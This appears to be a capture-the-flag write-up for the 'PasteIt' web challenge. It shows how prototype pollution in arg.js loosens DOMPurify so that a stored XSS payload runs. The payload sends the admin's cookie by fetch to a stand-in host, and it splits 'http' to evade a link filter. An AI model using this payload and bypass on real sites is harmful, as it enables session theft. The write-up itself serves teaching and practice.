# Web - PasteIt
* Given source code and link to a website, lets say `http://target`.
* Flag is on the admin cookie.
* There is a hidden feature `Report to Admin` on `http://target/<notes_uid>?dev=true`.
* We can't do common XSS because there is `DOMPurify v2.0.12`. We can bypass `DOMPurify` but at first we need Prototype Pollution.
* Luckily, there is `arg.js v1.4` that we can use to perform Prototype Pollution.  
* The arg.js v1.4 is vulnerable to prototype pollution, check out this [vulnerable code](https://github.com/stretchr/arg.js/blob/c025436431d30404fb0ef686696d629d411b5ed9/src/arg.js#L47-L133) and this [awesome github repo](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/arg-js.md).
* Create a note with this payload : 
```
<img src=x onerror=fetch('htt'+'p://yoursite/?x='+document.cookie)>
```
Note: can't use https:// or http:// because makeHyperLink() function. Check out this part of `routes/index.js`.
```
...
router.get('/api/paste/:id', (req, res) => {
    try {
        db.getPaste(req.params.id)
        .then((data) => {
            if (data) {
                const paste = url_handler.makeHyperLink(data.value);
                return res.send({
                    "value": paste
                });
            }
...
```
And checkout this code from `helper/url_handler.js`
```
makeHyperLink(text) {
    // check if text contains a link
    if(text.includes("http") || text.includes("www.")) {
        // if it does, return the text with the link wrapped in an anchor tag
        return text.replace(/(http|www.)\S+/g, (match) => `<a class="text-blue-600 underline" href="${match}">${match}</a>`);
    }
    return text;
}
```
* After creating a note with payload above, our payload still can't work normally because there is Dompurify. So, we try to access that note and add `/?dev=true&__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src` to your URL.
* `__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src` will make Dompurify not filtering `onerror` and `src` attribute. So, our payload can work normally.
* Then, report to admin.